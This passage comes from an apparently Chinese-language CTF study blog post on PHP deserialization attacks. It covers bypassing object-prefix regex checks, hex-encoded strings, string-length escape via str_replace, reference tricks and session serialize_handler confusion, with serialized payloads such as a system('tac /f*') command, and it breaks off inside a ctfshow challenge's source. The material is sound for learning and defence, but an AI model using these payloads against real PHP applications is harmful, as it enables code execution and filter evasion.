unserialize&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用方式1：当在代码中使用类似<code>preg_match(&#39;/^O:\d+/i&#39;,$data)</code>的正则语句来匹配是否是对象字符串开头的时候，可以使用<code>+</code>绕过</p><p><code>O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code><br><code>O:+8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code></p><p>要注意在<code>url</code>里传参时<code>+</code>要编码为<code>%2B</code></p><p>利用方式2：使用<code>array()</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">backdoor</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//a:1:&#123;i:0;O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#x27;tac /f*&#x27;);&quot;;&#125;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="检测’-’"><a href="#检测’-’" class="headerlink" title="检测’}’"></a>检测’}’</h3><p>有时候会遇到另一种正则，比如<code>/\&#125;$/</code>，会匹配最后一个<code>&#125;</code></p><p>反序列化字符串末尾的<code>&#125;&#125;&#125;&#125;</code>是可以全部删掉的，没有影响</p><p>比如<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#125;</code></p><p>变成<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;</code></p><p>甚至在末尾填充字符<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;aaaaaaaaaa</code></p><p>均能正常解析</p><h3 id="检测数字"><a href="#检测数字" class="headerlink" title="检测数字"></a>检测数字</h3><p>可以用字符<code>i</code>、<code>d</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/SJm2g</span><br><span class="hljs-comment">// echo serialize(0);</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:-1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:+1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:-1.1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:+1.2;&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h2><p>利用方式：当代码中存在类似<code>$this-&gt;a===$this-&gt;b</code>的比较时可以用<code>&amp;</code>，使<code>$a</code>永远与<code>$b</code>相等</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$this-&gt;b = &amp;$this-&gt;a;</code>表示<code>$b</code>变量指向的地址永远指向<code>$a</code>变量指向的地址</p><h2 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h2><p>利用方式：当代码中存在关键词检测时，将表示字符类型的<code>s</code>改为大写来绕过检测</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;admin888&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果过滤了关键字<code>admin</code>，可以将其替换成<code>O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;S:5:&quot;\61dmin&quot;;s:8:&quot;password&quot;;S:8:&quot;\61dmin888&quot;;&#125;</code></p><p>表示字符类型的s为大写时，就会被当成16进制解析</p><h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>);<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>由于<code>php</code>在进行反序列化时，是从左到右读取，读取多少取决于<code>s</code>后面的字符长度，且认为读到<code>&#125;</code>就结束了，<code>&#125;</code>后面的字符不会有影响</p><p>一般触发字符逃逸的条件是替换函数<code>str_replace</code>，使字符串长度改变，造成字符逃逸，读取到不一样的数据</p><h3 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以发现结果中的<code>aaa</code>被替换成了<code>aaaa</code>，但是长度值没变，还是<code>3</code>，这就导致多出了一个<code>a</code>，而且值是可控的，我们可以将这部分值变为 <code>很多aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;</code>， <code>很多aaa</code>的具体个数取决于后面想要构造的字符串的长度，这里是<code>21</code>位，就用<code>21</code>组<code>aaa</code>，这样替换后会多出<code>21</code>个字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:84:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$b</code>的值成功被修改成了<code>qaq</code></p><h3 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h3><p>原理与<code>过滤后字符变多</code>大同小异，就是前面少了，导致后面的字符被吃掉，从而执行了我们后面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:48:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:21:&quot;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>主要注意闭合就行了，与sql注入类似</p><h2 id="类属性不敏感"><a href="#类属性不敏感" class="headerlink" title="类属性不敏感"></a>类属性不敏感</h2><p>对于<code>PHP</code>版本<code>7.1+</code>，对属性的类型不敏感</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$hello</span>=<span class="hljs-string">&quot;private&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$this</span>-&gt;hello);<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:5:&quot;hello&quot;;s:6:&quot;public&quot;;&#125;&#x27;</span>);<br><span class="hljs-comment">//string(6) &quot;public&quot;</span><br></code></pre></td></tr></table></figure><p>令<code>public</code>时得到的序列化字符串，在<code>priviate</code>或者<code>protected</code>修饰的时候反序列化，<code>hello</code>属性都能获得值</p><h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><p>什么是session这里就不描述了，网上有很多文章可以参考</p><p>先了解下<code>PHP session</code>不同引擎的存储机制</p><p><code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的</p><p>session.serialize_handler定义的引擎共有三种：</p><table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 + 竖线 + 经过serialize()函数序列化处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值</td></tr><tr><td>php_serialize</td><td>经过serialize()函数序列化处理的数组</td></tr></tbody></table><p>当<code>php</code>和<code>php_serialize</code>这两个处理区混合起来使用，就会出现<code>session</code>反序列化漏洞。原因是<code>php_serialize</code>存储的反序列化字符可以引用<code>|</code>，如果这时候使用<code>php</code>处理器的格式取出<code>$_SESSION</code>的值，<code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞</p><h2 id="SESSION变量可控"><a href="#SESSION变量可控" class="headerlink" title="$_SESSION变量可控"></a>$_SESSION变量可控</h2><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//1.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;session&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><br><br><span class="hljs-comment">//2.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先在<code>1.php</code>传入<code>?session=lewiserii</code></p><p><code>session</code>的内容，因为1.php页面用的是<code>php_serialize</code>引擎，所以是序列化处理的数组的形式</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-1.png"></p><p>而2.php用的是<code>php</code>引擎，在可控点传入<code>|</code>+<code>序列化字符串</code>，然后再次访问2.php调用session值的时候会触发</p><p>传入<code>?session=|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:9:&quot;lewiserii&quot;;&#125;</code>后，文件中的值就变成了下图中的值</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-2.png"></p><p>再次访问2.php，发现成功反序列化，修改了<code>$name</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-3.png"></p><blockquote><p>总结：由于1.php是使用php_serialize引擎处理，因此只会把’|’当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。</p></blockquote><h2 id="SESSION变量不可控"><a href="#SESSION变量不可控" class="headerlink" title="$_SESSION变量不可控"></a>$_SESSION变量不可控</h2><p>当<code>$_SESSION</code>不能直接控制时，可以借助<code>PHP_SESSION_UPLOAD_PROGRESS</code>来完成反序列化</p><p>关于<code>PHP_SESSION_UPLOAD_PROGRESS</code>的介绍可以参考我的另一篇文章<a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93.html#session-upload-progress%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">session.upload_progress文件包含</a></p><p>这里用ctfshow的一道新春题的前半部分作例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;session.serialize_handler&quot;</span>, <span class="hljs-string">&quot;php&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$happy</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-variable">$happy</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$happy</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy=<span class="hljs-string">&quot;Happy_New_Year!!!&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;happy;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$funName</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;happy;<br>        &#125;<br><br><br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_New_</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$daniu</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$robot</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$notrobot</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_New_</span>;<br>        <span 